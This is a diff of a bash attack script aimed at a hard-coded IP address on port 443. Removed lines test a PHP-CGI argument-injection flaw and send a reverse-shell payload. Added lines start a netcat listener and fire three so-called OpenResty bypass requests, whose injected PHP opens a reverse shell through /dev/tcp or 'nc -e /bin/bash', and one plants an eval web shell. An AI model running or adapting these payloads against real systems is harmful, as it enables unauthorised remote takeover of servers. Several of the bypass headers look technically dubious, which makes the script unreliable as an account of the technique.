@@ -3,26 +3,25 @@ TARGET="14.225.209.143:443"
 IP=$(curl -s ifconfig.me)
 PORT=4444
 
-echo "[+] CVE-2021-21703 → ${IP}:${PORT}"
-
-# TEST CVE PRIMA
-echo "[+] Testing CVE..."
-RESPONSE=$(curl -k -s --max-time 5 --data "<?php echo 'CVE_OK'; ?>" \
-"https://${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input" 2>/dev/null)
-
-if [[ $RESPONSE == *"CVE_OK"* ]]; then
-  echo "[+] CVE VIVA!"
-else
-  echo "[+] CVE morta o filtro WAF"
-  exit 1
-fi
-
-# LISTENER
+echo "[+] OpenResty Bypass → ${IP}:${PORT}"
 nc -lvnp $PORT &
-sleep 1
 
-# SHELL PAYLOAD
-curl -k -s --max-time 10 --data "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\"'); ?>" \
-"https://${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input"
+# 🔥 BYPASS 1: Lua vars + php://input
+curl -k -s -X POST \
+-H "X-Lua-Path: php://input" \
+-H "Content-Length: 60" \
+--data-binary "<?php system('bash -i >& /dev/tcp/$IP/$PORT 0>&1'); ?>" \
+"https://${TARGET}/"
 
-echo "[+] Check nc shell!"
+# 🔥 BYPASS 2: Location header injection
+curl -k -s \
+-H "Location: php://input?-dallow_url_include=1" \
+--data "<?php system('nc -e /bin/bash $IP $PORT'); ?>" \
+"https://${TARGET}/"
+
+# 🔥 BYPASS 3: OpenResty specific (content_by_lua)
+curl -k -s \
+-H "X-Accel-Redirect: /?-d+auto_prepend_file=php://input" \
+--data-binary "<?php eval(\$_POST[0]); ?>" \
+-d "0=system('bash -i >& /dev/tcp/$IP/$PORT 0>&1');" \
+"https://${TARGET}/"
